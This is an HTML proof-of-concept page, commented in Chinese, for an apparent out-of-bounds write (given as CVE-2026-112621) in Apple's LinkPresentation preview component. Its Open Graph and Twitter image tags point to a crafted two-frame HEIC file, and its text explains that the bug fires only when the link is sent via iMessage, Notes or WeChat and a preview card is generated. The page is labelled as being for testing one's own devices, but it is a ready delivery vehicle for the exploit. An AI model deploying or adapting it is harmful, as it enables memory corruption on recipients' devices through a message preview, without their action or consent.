<!doctype html>
<html lang="zh">
<head>
  <meta charset="utf-8">
  <title>Cinder27 · LinkPresentation 探测</title>
  <!-- CVE-2026-112621 的组件是 LinkPresentation，不是 ImageIO。
       预览卡片会抓 og:image 并把它画进固定尺寸的卡片里——
       这才是「帧0 定几何、帧1 越界写」该生效的那条路。 -->
  <meta property="og:type" content="website">
  <meta property="og:title" content="Cinder27 LinkPresentation probe">
  <meta property="og:description" content="两帧 HEIC：帧0 256x16，帧1 256x48。仅用于自有设备验证。">
  <meta property="og:image" content="heic_two_frames.heic">
  <meta property="og:image:type" content="image/heic">
  <meta property="og:image:width" content="256">
  <meta property="og:image:height" content="48">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="heic_two_frames.heic">
</head>
<body>
<p>Cinder27 · LinkPresentation probe</p>
<p>把本页链接发给自己的 iMessage / 备忘录 / 微信，观察预览是否正常生成。</p>
<p>直接把本页在 Safari 打开不会触发 —— og:image 只被「生成预览卡片」的路径解析。</p>
</body>
</html>
